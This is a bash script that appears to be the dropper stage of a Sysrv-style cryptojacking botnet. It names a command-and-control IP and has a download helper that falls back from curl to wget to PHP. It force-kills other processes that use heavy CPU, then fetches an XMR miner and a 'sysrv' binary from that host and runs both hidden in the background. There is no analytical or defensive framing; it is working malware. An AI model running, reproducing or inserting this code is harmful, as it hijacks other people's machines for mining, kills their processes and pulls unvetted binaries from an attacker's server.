#!/bin/bash

cc='http://185.239.242.71'

get() {
	curl -fsSL "$1" > "$2" || wget -q -O - "$1" > "$2" || php -r "file_put_contents('$2', file_get_contents('$1'));"
	chmod +x "$2"
}

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /

# filter hich cpu usage proc
ps axf -o "pid %cpu" | awk '{if($2>=50.0) print $1}' | while read pid; do
    cat /proc/$pid/cmdline | grep -a -E "sysrv|network01"

    if [ $? -ne 0 ]; then
        echo "not my proc, kill $pid"
        kill -9 $pid
    fi
done


ps -fe | grep network01 | grep -v grep
if [ $? -ne 0 ]; then
    echo "no miner runing"
    if [ $(getconf LONG_BIT) = '64' ]; then
        echo "downloading xmr64..."
        get "$cc/xmr64" network01
    else
        echo "downloading xmr32..."
        get "$cc/xmr32" network01
    fi
    
    nohup ./network01 1>/dev/null 2>&1 &
fi


ps -fe | grep sysrv | grep -v grep
if [ $? -ne 0 ]; then
    echo "no sysrv runing"
    get "$cc/sysrv" sysrv
    nohup ./sysrv 1>/dev/null 2>&1 &
fi
